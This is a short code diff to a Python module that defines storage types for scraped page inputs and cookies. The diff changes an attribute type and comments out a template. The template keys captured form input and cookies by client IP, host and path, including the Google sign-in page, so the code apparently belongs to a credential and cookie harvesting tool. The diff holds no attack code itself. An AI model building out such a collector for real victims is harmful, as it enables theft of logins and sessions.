@@ -5,13 +5,9 @@ class ScrapeTypeEnum:
     INPUTS = "inputs"
     COOKIES = "cookies"
 
-class AttributeType(TypedDict):
-    name: str
-    value: str
-
 class ElementType(TypedDict):
     tag: str
-    attributes: List[AttributeType]
+    attributes: List[Tuple[str, str]]
     value: str
 
 class DataCollectionType(TypedDict):
@@ -24,32 +20,32 @@ def newDataCollectionType() -> DataCollectionType:
 
 StorageDataType = Dict[str, Dict[str, Dict[str, DataCollectionType]]]
 
-template: StorageDataType = {
-    "127.0.0.1": {
-        "www.google.com": {
-            "/search": {
-                ScrapeTypeEnum.INPUTS: [
+# template: StorageDataType = {
+#     "127.0.0.1": {
+#         "www.google.com": {
+#             "/search": {
+#                 ScrapeTypeEnum.INPUTS: [
 
-                ],
-                ScrapeTypeEnum.COOKIES: [
+#                 ],
+#                 ScrapeTypeEnum.COOKIES: [
 
-                ],
-                "href": []
-            },
-        },
-        "accounts.google.com": {
-            "/signin/v2/identifier": {
-                ScrapeTypeEnum.INPUTS: [
-                    # list of (time, href, data)
-                ],
-                ScrapeTypeEnum.COOKIES: [
-                    # list of (time, href, cookie)
-                ],
-                "href": []
-            },
-        }
-    },
-}
+#                 ],
+#                 "href": []
+#             },
+#         },
+#         "accounts.google.com": {
+#             "/signin/v2/identifier": {
+#                 ScrapeTypeEnum.INPUTS: [
+#                     # list of (time, href, data)
+#                 ],
+#                 ScrapeTypeEnum.COOKIES: [
+#                     # list of (time, href, cookie)
+#                 ],
+#                 "href": []
+#             },
+#         }
+#     },
+# }
 
 class Storage:
     def __init__(self) -> None:
